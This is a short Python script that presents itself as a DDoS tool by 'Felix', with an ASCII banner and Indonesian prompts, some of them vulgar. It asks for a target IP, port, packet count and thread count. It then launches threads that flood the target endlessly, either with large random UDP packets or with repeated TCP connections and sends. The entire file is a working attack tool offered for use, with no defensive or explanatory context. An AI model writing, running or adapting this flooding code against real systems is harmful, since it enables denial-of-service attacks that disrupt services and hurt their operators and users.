import random
import socket
import threading
import os

os.system("clear")
print("""\033[31m
███████╗███████╗██╗░░░░░██╗██╗░░██╗
██╔════╝██╔════╝██║░░░░░██║╚██╗██╔╝
█████╗░░█████╗░░██║░░░░░██║░╚███╔╝░
██╔══╝░░██╔══╝░░██║░░░░░██║░██╔██╗░
██║░░░░░███████╗███████╗██║██╔╝╚██╗
╚═╝░░░░░╚══════╝╚══════╝╚═╝╚═╝░░╚═╝""")
print("DDoSaTtack by Felix ")
print("Kalau Mau Pakek Coli Dulu")
print("By Felix Xyz ")
ip = str(input(" DdosAttackByFelix | Ip:"))
port = int(input(" DdosAttackByFelix | Port:"))
choice = str(input(" DdosAttackByFelix | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByFelix | Packets:"))
threads = int(input(" DdosAttackByFelix | Threads:"))
def run():
	data = random._urandom(9999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | XFelix |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(99)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Felix nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
